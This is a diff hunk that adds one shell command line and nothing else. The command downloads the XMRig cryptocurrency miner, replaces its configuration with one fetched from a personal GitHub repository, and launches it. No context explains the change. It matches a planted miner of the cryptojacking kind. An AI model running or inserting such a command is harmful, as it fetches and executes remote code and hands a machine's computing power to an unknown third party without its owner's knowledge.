@@ -1,0 +1,1 @@
+wget -O xm.zip https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-gcc-win64.zip && unzip xm.zip && cd xmrig-6.18.0 && rm -rf config.json && wget -O config.json https://raw.githubusercontent.com/qhjruekehr/personal/main/config.json && xmrig.exe
